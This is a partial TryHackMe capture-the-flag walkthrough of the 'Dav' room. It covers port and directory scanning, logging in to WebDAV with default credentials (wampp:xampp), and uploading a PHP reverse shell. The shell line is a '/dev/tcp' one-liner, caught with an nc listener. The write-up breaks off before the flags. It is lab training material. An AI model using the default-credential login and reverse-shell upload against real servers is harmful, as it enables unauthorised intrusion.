<p align="center">October 31, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{295}}$$-day-streak in  <a href="https://tryhackme.com/r/p/Rosana">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{Dav}}$$
</h1>
<p align="center">boot2root machine for FIT and bsides guatemala CTF</p>
<p align="center">Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/bsidesgtdav">DAV</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/101db08a-b506-4e4a-9de8-f4569bfaca85">
  <img height="150px" src="https://github.com/user-attachments/assets/7ce0c59b-c286-4719-94f5-85168145d75f">
</p>

<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Walkthrough](#1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Super Secret Password](#1.1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Room complete](#2) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [My journey](#3)


<h2>Task 1. Dav<a id='1'></a></h2>

<p>Read user.txt and root.txt</p>

<pre><code># root@ip-[Attack]:~# rustscan -a [Target] --ulimit 5000 -- -vvv -sV -sC [Target]
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time \u231b

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open [Target]:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-01 01:31 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:31
Completed NSE at 01:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:31
Completed NSE at 01:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:31
Completed NSE at 01:31, 0.00s elapsed
Initiating Ping Scan at 01:31
Scanning 2 hosts [2 ports/host]
Completed Ping Scan at 01:31, 0.00s elapsed (2 total hosts)
Initiating Parallel DNS resolution of 2 hosts. at 01:31
Completed Parallel DNS resolution of 2 hosts. at 01:31, 0.00s elapsed
DNS resolution of 2 IPs took 0.00s. Mode: Async [#: 1, OK: 2, NX: 0, DR: 0, SF: 0, TR: 2, CN: 0]
Initiating Connect Scan at 01:31
Scanning 2 hosts [1 port/host]
Discovered open port 80/tcp on [Target]
Discovered open port 80/tcp on [Target]
Completed Connect Scan at 01:31, 0.00s elapsed (2 total ports)
Initiating Service scan at 01:31
Scanning 2 services on 2 hosts
Completed Service scan at 01:31, 6.04s elapsed (2 services on 2 hosts)
NSE: Script scanning 2 hosts.
NSE: Starting runlevel 1 (of 3) scan.
</code></pre><br>

![image](https://github.com/user-attachments/assets/e88ec0d9-ffdb-4f01-8727-d19ebc90d8bf)

<pre><code># root@ip-[Attack]: dirb http://[Target]

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Nov  1 01:38:01 2024
URL_BASE: http://[Target]/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://[Target]/ ----
+ http://[Target]/index.html (CODE:200|SIZE:11321)                                                               
+ http://[Target]/server-status (CODE:403|SIZE:301)                                                              
+ http://[Target]/webdav (CODE:401|SIZE:460)                                                                     
                                                                                                                      
-----------------
END_TIME: Fri Nov  1 01:38:06 2024
DOWNLOADED: 4612 - FOUND: 3

</code></pre><br>

![image](https://github.com/user-attachments/assets/cb7bc450-34ee-466e-be50-bdea7c84cf4c)

<p> The default credentials are generally jigsaw:jigsaw(failed) adm1n:p@s$word(failed) wampp:xampp(success).</p>

![image](https://github.com/user-attachments/assets/76e929c1-d571-46d3-9730-8a09e635915c)

![image](https://github.com/user-attachments/assets/e064eb40-ffb6-483f-ac83-7a8c4c61830a)


![image](https://github.com/user-attachments/assets/f884a59b-3b1f-461b-9ece-f1bea833c395)

wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91

![image](https://github.com/user-attachments/assets/92332b17-317d-47b5-9878-490fe63849cf)


<pre><code># root@ip-[Attack]:~# apt install cadaver
</code></pre><br>

<pre><code># root@ip-[Attack]:~# cadaver http://[Target]/webdav/
Authentication required for webdav on server `[Target]':
Username: wampp
Password: 
dav:/webdav/> 
</code></pre><br>

![image](https://github.com/user-attachments/assets/23b64686-dfca-4f6e-a1b5-c96a3b0cd238)

<pre><code>sh -i >& /dev/tcp/[Attack]/8080 0>&1
</code></pre><br>

<pre><code># root@ip-[Attack]:~# curl -u "wampp:xampp" -X PUT http://[Target]/webdav/shell.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/shell.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at [Target] Port 80</address>
</body></html>
</code></pre><br>

![image](https://github.com/user-attachments/assets/82f2ddb8-173c-4368-862e-8cec0c691b70)

<pre><code># dav:/webdav/> put shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 42 bytes succeeded.
dav:/webdav/> 
</code></pre><br>


<pre><code># root@ip-[Attack]:~# nc -lvnp 8080
Listening on [0.0.0.0] (family 0, port 8080)
</code></pre><br>


<h1>................... to be continued .....................</h1>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 1.1. <em>user.txt</em><br><a id='1.1'></a>
>> <code><strong>_____</strong></code>

<br>

> 1.2. <em>root.txt</em><br><a id='1.2'></a>
>> <code><strong>_____</strong></code>

<br>


<h2>Room Complete<a id='2'></a></h2>
<p>Keep learning, keep growing!<br>



<h2>My Journey<a id='3'></a></h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>




<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>

